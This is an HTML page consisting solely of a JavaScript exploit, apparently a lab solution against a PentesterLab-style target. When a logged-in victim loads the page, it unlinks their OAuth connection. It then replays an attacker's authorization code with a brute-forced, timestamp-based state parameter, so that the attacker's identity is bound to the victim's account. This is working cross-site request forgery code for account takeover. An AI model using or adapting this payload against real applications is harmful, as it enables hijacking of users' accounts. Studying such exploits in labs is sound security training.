<!DOCTYPE html>
<html>
  <head>
  </head>
  <body>
<script>


(async ()=>{
    var client_url = "http://ptl-357e63f6-544b1c72.libcurl.so"
    var code = "ccf55624834ed18a8b504ed2be260dfabd809236e1a92e9aed6be239a0168acd"
    var state = "2021080907"

    function zeroPad(num, size) {
        num = num.toString();
        while (num.length < size) num = "0" + num;
        return num;
    }

    var d=new Date()
    var utc_m = d.getUTCMinutes()

    try {
        await fetch(client_url+"/unlink", {
            credentials: 'include'
        })
    }
    catch(e) {
        console.log("BB"+e);
    }
    for (let m=utc_m-1; m<utc_m+2; m++)
    {
        try {
            await fetch(client_url+"/users/auth/myprovider", {
                credentials: 'include'
            })
        }
        catch(e) {
            console.log("BB"+e);
        }
        try {
            await fetch(client_url+"/users/auth/myprovider/callback?code="+code+"&state="+state+zeroPad(m,2) , {
                credentials: 'include'
            })
        }
        catch(e) {
            console.log("BB"+e);
        }
    }

})();
</script>
  </body>
</html>
